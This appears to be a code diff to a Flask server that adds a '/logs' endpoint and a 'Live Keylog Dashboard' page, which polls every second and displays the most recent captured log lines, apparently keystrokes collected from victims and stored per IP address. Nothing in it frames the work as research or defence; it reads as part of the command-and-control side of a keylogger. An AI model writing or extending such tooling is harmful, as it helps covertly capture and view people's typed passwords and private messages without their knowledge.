@@ -24,6 +24,58 @@ def post():
 @app.route('/home', methods=['GET'])
 def home():
     return {'message' : "Welcome"}, 200
+@app.route('/logs', methods=['GET'])
+def logs():
+    try:
+        with open("127.0.0.1.log", "r") as f:  # Change filename if needed
+            lines = f.readlines()[-50:]  # Last 50 lines
+        return {'logs': lines}, 200
+    except FileNotFoundError:
+        return {'logs': ["No logs found."]}, 200
+@app.route('/dashboard')
+def dashboard():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Keylog Dashboard</title>
+        <style>
+            body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; }
+            h1 { color: #333; }
+            #logs { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            .log-line { border-bottom: 1px solid #ddd; padding: 5px; }
+        </style>
+    </head>
+    <body>
+        <h1>🔐 Live Keylog Dashboard</h1>
+        <div id="logs">Loading...</div>
+
+        <script>
+            function fetchLogs() {
+                fetch('/logs')
+                    .then(response => response.json())
+                    .then(data => {
+                        const logContainer = document.getElementById('logs');
+                        logContainer.innerHTML = '';
+                        data.logs.forEach(line => {
+                            const div = document.createElement('div');
+                            div.className = 'log-line';
+                            div.textContent = line;
+                            logContainer.appendChild(div);
+                        });
+                    })
+                    .catch(err => {
+                        document.getElementById('logs').innerText = "Error loading logs.";
+                    });
+            }
+
+            setInterval(fetchLogs, 1000);  // Refresh every second
+            fetchLogs();
+        </script>
+    </body>
+    </html>
+    '''
+
 
 def savelogs(log, source):
     now = datetime.now()
